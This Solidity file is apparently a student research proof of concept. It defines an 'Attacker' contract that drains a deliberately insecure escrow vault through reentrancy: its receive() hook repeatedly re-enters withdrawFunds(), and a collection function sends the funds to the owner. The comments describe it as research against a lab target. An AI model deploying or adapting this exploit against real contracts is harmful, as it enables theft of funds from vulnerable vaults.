// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

/// @dev Minimal interface to interact with InsecureVault (or any vault with matching ABI)
interface IVault {
    function withdrawFunds() external;
    function getBalance(address _account) external view returns (uint256);
    function getContractBalance() external view returns (uint256);
}

/**
 * @title Attacker
 * @author Research PoC — Nurcahya Priantoro (G6401221049)
 * @notice Malicious contract designed to exploit reentrancy in InsecureVault.
 *
 * @dev Attack mechanism:
 *   1. Attacker registers as a seller in InsecureVault with a legitimate 0.1 ETH deposit.
 *   2. Buyer confirms delivery → seller's balance becomes withdrawable.
 *   3. Attacker calls attack() → triggers withdrawFunds() on target.
 *   4. Target sends ETH to Attacker → triggers receive() fallback.
 *   5. receive() re-enters withdrawFunds() BEFORE target updates balances[attacker] = 0.
 *   6. Loop continues until target contract is drained or gas is exhausted.
 *   7. Attacker collects all stolen ETH by calling collectFunds().
 *
 * @dev Threat model compliance:
 *   - Attacker deploys this contract independently on EVM ✅
 *   - Attacker has legitimate seller access to call withdrawFunds ✅
 *   - Attacker programs recursive logic in receive() ✅
 *   - No flash loans or external mechanisms required ✅
 */
contract Attacker {

    // =========================================================================
    // STATE VARIABLES
    // =========================================================================

    /// @notice The target vulnerable vault contract
    IVault public immutable target;

    /// @notice The owner of this attacker contract (the attacker's EOA)
    address public immutable owner;

    /// @notice Maximum number of recursive re-entries to prevent out-of-gas
    /// @dev Set to a safe value; the actual drain limit is the target's balance
    uint256 public constant MAX_REENTRIES = 30;

    /// @notice Counts how many times receive() has been triggered during an attack
    uint256 public reentrancyCount;

    // =========================================================================
    // EVENTS
    // =========================================================================

    event AttackInitiated(address indexed target, uint256 attackerBalance);
    event ReentryTriggered(uint256 indexed iteration, uint256 targetBalance);
    event AttackCompleted(uint256 totalDrained);

    // =========================================================================
    // CONSTRUCTOR
    // =========================================================================

    /**
     * @param _target The address of the InsecureVault contract to attack.
     */
    constructor(address _target) {
        require(_target != address(0), "Attacker: invalid target address");
        target = IVault(_target);
        owner = msg.sender;
    }

    // =========================================================================
    // ATTACK FUNCTIONS
    // =========================================================================

    /**
     * @notice Initiate the reentrancy attack.
     * @dev Pre-condition: This contract must have a non-zero balance in the target
     *      (i.e., a buyer must have created an order with this contract as seller,
     *      deposited funds, and confirmed delivery).
     *
     * @dev Attack flow:
     *   attack() → target.withdrawFunds() → [ETH sent to Attacker] →
     *   receive() → target.withdrawFunds() → [ETH sent to Attacker] →
     *   receive() → ... [recursive until balance drained]
     */
    function attack() external {
        require(msg.sender == owner, "Attacker: only owner can initiate attack");
        require(
            target.getBalance(address(this)) > 0,
            "Attacker: no balance in target to withdraw"
        );

        reentrancyCount = 0;

        emit AttackInitiated(address(target), target.getContractBalance());

        // Trigger the first withdrawal — this will cascade via receive()
        target.withdrawFunds();

        emit AttackCompleted(address(this).balance);
    }

    /**
     * @notice The reentrancy hook. Called automatically when this contract receives ETH.
     * @dev This is the core of the exploit. When InsecureVault's withdrawFunds() sends ETH
     *      to this contract via .call{value: amount}(""), this function is automatically
     *      invoked. At this point, InsecureVault has NOT yet updated balances[address(this)]
     *      to zero. Therefore, the balance check in withdrawFunds() still passes, allowing
     *      another recursive call.
     *
     * @dev Guard: We check target.getContractBalance() > 0 to stop when the target is
     *      drained and MAX_REENTRIES to prevent out-of-gas in extreme cases.
     */
    receive() external payable {
        reentrancyCount++;

        uint256 targetBalance = target.getContractBalance();

        emit ReentryTriggered(reentrancyCount, targetBalance);

        // Continue draining as long as target has funds and we haven't hit the safety cap
        if (targetBalance > 0 && reentrancyCount < MAX_REENTRIES) {
            target.withdrawFunds();
        }
    }

    // =========================================================================
    // FUND RECOVERY
    // =========================================================================

    /**
     * @notice Collect all stolen ETH to the attacker's EOA.
     * @dev Called after the attack completes to exfiltrate funds.
     */
    function collectFunds() external {
        require(msg.sender == owner, "Attacker: only owner can collect funds");
        uint256 balance = address(this).balance;
        require(balance > 0, "Attacker: nothing to collect");

        (bool success, ) = owner.call{value: balance}("");
        require(success, "Attacker: collection transfer failed");
    }

    // =========================================================================
    // VIEW FUNCTIONS
    // =========================================================================

    /// @notice Returns the current ETH balance of this attacker contract.
    function getAttackerBalance() external view returns (uint256) {
        return address(this).balance;
    }

    /// @notice Returns the number of reentrancy iterations in the last attack.
    function getReentrancyCount() external view returns (uint256) {
        return reentrancyCount;
    }
}
